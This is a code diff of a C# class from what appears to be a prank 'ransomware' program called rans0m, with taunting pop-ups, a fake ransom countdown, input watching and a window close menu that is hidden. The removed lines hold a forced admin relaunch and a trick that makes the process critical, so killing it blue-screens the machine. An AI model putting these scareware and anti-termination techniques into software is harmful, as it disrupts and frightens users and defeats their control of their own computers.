@@ -1,15 +1,16 @@
-﻿using System.Diagnostics;
+﻿using System.IO;
 using System.Runtime.InteropServices;
-using System.Security.Principal;
+using System.Windows;
+using System.Windows.Forms;
+using System.Windows.Interop;
+using System.Windows.Media.Imaging;
+using WpfApplication = System.Windows.Application;
 
 namespace rans0m
 {
     public class Global
     {
-        // ----------------------------- CONFIGURATION -----------------------------
-        public static readonly int minRansomTime = 26*3; // In seconds (duration of a ransom attack because else you can have two at the same time and i don't have time to fix it correctly rn)
-        public static readonly int maxRansomTime = 10*60; // In seconds
-
+        public static Overlay? overlayWindow;
         // Titles used by the pop up windows
         public static readonly List<string> tauntTitles = new() {
             "RANS0M",
@@ -26,162 +27,205 @@ namespace rans0m
             "GIVE MONEY",
             "ERROR",
             "DHAUFGH",
-            "_________"
+            "_________",
+            "IMG.JPG"
         };
 
         // Images used by the pop up windows
-        public static readonly List<Bitmap> tauntImages = new() {
-            Properties.Resources.glitch,
-            Properties.Resources.idiot,
-            Properties.Resources.ransom_idle,
-            Properties.Resources.ransom_random,
-            Properties.Resources.stop_sign,
-            Properties.Resources.static1,
-            Properties.Resources.taunt2,
-            Properties.Resources.taunt3,
-        };
+        private static List<BitmapImage> _tauntImages;
+        public static List<BitmapImage> tauntImages
+        {
+            get
+            {
+                if (_tauntImages == null)
+                {
+                    _tauntImages = new()
+                    {
+                        LoadBitmapImage("pack://application:,,,/Assets/Taunts/glitch1.jpg"),
+                        LoadBitmapImage("pack://application:,,,/Assets/Taunts/glitch2.jpeg"),
+                        LoadBitmapImage("pack://application:,,,/Assets/Taunts/glitch3.jpg"),
+                        LoadBitmapImage("pack://application:,,,/Assets/Taunts/glitch4.jpg"),
+                        LoadBitmapImage("pack://application:,,,/Assets/Taunts/glitch5.jpg"),
+                        LoadBitmapImage("pack://application:,,,/Assets/Taunts/idiot.png"),
+                        LoadBitmapImage("pack://application:,,,/Assets/Taunts/tauntface.png"),
+                        LoadBitmapImage("pack://application:,,,/Assets/Taunts/tauntflower.png"),
+                    };
+                }
+                return _tauntImages;
+            }
+        }
 
 
 
 
 
-        // -------------------------- GLOBAL VARIABLES --------------------------
+        // ----------------- GLOBAL VARIABLES -----------------
 
-        public static int ransomLeft = 0;
+        public static int ransomLeft = 0; // Cash to pay
+        public static int ransomTimeLeft = 0; // 3rd phase countdown
         public static bool underRansom = false;
         public static Action? RansomPayed;
-        public static List<string> usedCoins = new();
+        public static List<string> usedCoins = new(); // this is to avoid people from copy pasting coins, not that secure tho
+
+        public static bool crucifixUsed = false;
         public static bool canAttack = true;
-        public static Point lastRegisteredMousePos;
+        public static System.Drawing.Point lastRegisteredMousePos;
         public static bool spyingMouse = false;
 
         public static Random rng = new Random();
-        public static Rectangle screenBounds = Screen.PrimaryScreen.WorkingArea;
-
-
-        
+        public static System.Drawing.Rectangle screenBounds => Screen.PrimaryScreen.WorkingArea;
 
 
 
 
-        // -------------------------- PUBLIC METHODS --------------------------
+
+
+
+        // ---------------------- PUBLIC METHODS ----------------------
+
+        public static double Lerp(double a, double b, double t)
+        {
+            return a + (b - a) * t;
+        }
+
+        private static BitmapImage LoadBitmapImage(string uri)
+        {
+            BitmapImage bitmap = new BitmapImage();
+            bitmap.BeginInit();
+            bitmap.UriSource = new Uri(uri);
+            bitmap.CacheOption = BitmapCacheOption.OnLoad;
+            bitmap.EndInit();
+            bitmap.Freeze();
+            return bitmap;
+        }
+
+        static public byte[] GetBytesFromResource(string uri)
+        {
+            System.Windows.Resources.StreamResourceInfo streamInfo = WpfApplication.GetResourceStream(new Uri($"pack://application:,,,/Assets/{uri}"));
+            byte[] bytes = new byte[streamInfo.Stream.Length];
+            streamInfo.Stream.Read(bytes, 0, (int)streamInfo.Stream.Length);
+
+            return bytes;
+        }
+
+        static public Stream GetResourceSteam(string uri)
+        {
+            return WpfApplication.GetResourceStream(new Uri($"pack://application:,,,/Assets/{uri}")).Stream;
+        }
+
+        static public Thickness CombineThickness(Thickness a, Thickness b)
+        {
+            return new Thickness(a.Left+b.Left, a.Top+b.Top, a.Right+b.Right, a.Bottom+b.Bottom);
+        }
 
         public static void KeyPressed(Keys key)
-        { 
-            if (spyingMouse) {
-                lastRegisteredMousePos = new Point(-1, -1); // Invalidate the last registered mouse position if a key is pressed during the spy phase so it also triggers the ransom
-            }
-        }
-
-        /// <returns>true if the application is started as administrator</returns>
-        public static bool IsAdministrator()
         {
-            return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
-        }
-
-        /// <summary>
-        /// Tries to restart the process as admin
-        /// </summary>
-        public static void AttemptForceAdmin()
-        {
-            if (!Global.IsAdministrator()) // If process not ran as admin
+            if (spyingMouse)
             {
-                try
-                {
-                    var proc = new Process
-                    {
-                        StartInfo =
-                    {
-                        FileName = Process.GetCurrentProcess().MainModule.FileName,
-                        UseShellExecute = true,
-                        Verb = "runas"
-                    }
-                    };
-
-                    proc.Start(); // Start new process as admin
-                    Process.GetCurrentProcess().Kill(); // Kill current process
-                }
-                catch {
-                    //MessageBox.Show("RANS0M requires admin privileges.", "RANS0M");
-                    //Process.GetCurrentProcess().Kill(); // Kill process
-                    // Not forcing admin anymore since I can just shutdown the computer without admin privileges
-                }
+                lastRegisteredMousePos = new System.Drawing.Point(-1, -1); // Invalidate the last registered mouse position if a key is pressed during the spy phase so it also triggers the ransom
             }
-        }
-
-        /// <summary>
-        /// Transforms the process into a critical process, which will cause a BSOD if it is killed
-        /// </summary>
-        public static void IntoCriticalProcess()
-        {
-            [DllImport("ntdll.dll", SetLastError = true)]
-            static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
-            int isCritical = 1;
-            int BreakOnTermination = 0x1D;  // flag BreakOnTermination
-            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
         }
 
         /// <summary>
         /// Randomly positions a control within the screen bounds.
         /// </summary>
-        public static void RandomPosControl(Control control)
+        public static void RandomPosWindow(Window window)
         {
-            int x = Global.rng.Next(0, Global.screenBounds.Width - control.Width);
-            int y = Global.rng.Next(0, Global.screenBounds.Height - control.Height);
+            int x = Global.rng.Next(0, (int)(Global.screenBounds.Width - window.ActualWidth));
+            int y = Global.rng.Next(0, (int)(Global.screenBounds.Height - window.ActualHeight));
 
-            control.Location = new Point(x, y);
+            window.Left = x;
+            window.Top = y;
+        }
+
+        /// <summary>
+        /// Randomly positions a control within the screen bounds.
+        /// </summary>
+        public static void RandomPosControl(FrameworkElement element)
+        {
+            int x = Global.rng.Next(0, (int)(Global.screenBounds.Width - element.ActualWidth));
+            int y = Global.rng.Next(0, (int)(Global.screenBounds.Height - element.ActualHeight));
+
+            element.Margin = new Thickness(x, y, 0, 0);
         }
 
         /// <summary>
         /// Centers a control within the screen bounds.
         /// </summary>
-        public static void CenterControl(Control control)
+        public static void CenterControl(FrameworkElement element)
         {
-            control.Location = new Point((Global.screenBounds.Width / 2) - control.Width / 2, (Global.screenBounds.Height / 2) - control.Height / 2);
+            element.Margin = new Thickness((Global.screenBounds.Width / 2) - element.ActualWidth / 2, (Global.screenBounds.Height / 2) - element.ActualHeight / 2, 0, 0);
+        }
+
+        /// <summary>
+        /// Centers a control within the screen bounds.
+        /// </summary>
+        public static void CenterWindow(Window window)
+        {
+            window.Left = (Global.screenBounds.Width / 2) - window.ActualWidth / 2;
+            window.Top = (Global.screenBounds.Height / 2) - window.ActualHeight / 2;
         }
 
         /// <summary>
         /// Cool glitch idle animation, used for the ransom pop ups
         /// </summary>
-        public async static void GlitchIdle(Control control, bool divideAndTaunt=false)
+        public static async void GlitchIdle(Window control, bool divideAndTaunt = false)
         {
-            int x = control.Location.X;
-            int y = control.Location.Y;
+            (double x, double y) = await control.Dispatcher.InvokeAsync(() =>
+                (control.Left, control.Top));
 
-            while (!control.IsDisposed)
+            while (true)
             {
                 await Task.Delay(200);
-                if (control.IsDisposed) break;
-
                 try
                 {
                     if (!Global.underRansom)
                     {
-                        control.Invoke(() => control.Dispose());
+                        await control.Dispatcher.InvokeAsync(() =>
+                        {
+                            control.Close();
+                        });
                         break;
                     }
 
-                    control.Invoke((MethodInvoker)delegate
+                    await control.Dispatcher.InvokeAsync(() =>
                     {
                         if (divideAndTaunt)
                         {
-                            if (Global.rng.Next(1, 100) <= 2) // 2% chance that the control teleports somewhere else and spawns a TauntWindow
+                            if (Global.rng.Next(1, 100) <= 2)
                             {
-                                x = Global.rng.Next(0, Global.screenBounds.Width - control.Width);
-                                y = Global.rng.Next(0, Global.screenBounds.Height - control.Height);
-
+                                x = Global.rng.Next(0, (int)(Global.screenBounds.Width - control.ActualWidth));
+                                y = Global.rng.Next(0, (int)(Global.screenBounds.Height - control.ActualHeight));
                                 TauntWindow tauntWindow = new TauntWindow();
                                 tauntWindow.Show();
                             }
                         }
 
-                        // Sets random position
-                        control.Location = new Point(x + Global.rng.Next(-5, 5), y + Global.rng.Next(-5, 5));
+                        control.Left = x + Global.rng.Next(-5, 5);
+                        control.Top = y + Global.rng.Next(-5, 5);
                     });
                 }
-                catch { break; }
+                catch
+                {
+                    break;
+                }
             }
         }
 
+        [DllImport("user32.dll")]
+        private static extern int GetWindowLong(IntPtr hwnd, int index);
+
+        [DllImport("user32.dll")]
+        private static extern int SetWindowLong(IntPtr hwnd, int index, int newStyle);
+
+        private const int GWL_STYLE = -16;
+        private const int WS_SYSMENU = 0x80000;
+
+        public static void HideSystemMenu(Window window)
+        {
+            IntPtr hwnd = new WindowInteropHelper(window).Handle;
+            int style = GetWindowLong(hwnd, GWL_STYLE);
+            SetWindowLong(hwnd, GWL_STYLE, style & ~WS_SYSMENU);
+        }
     }
 }
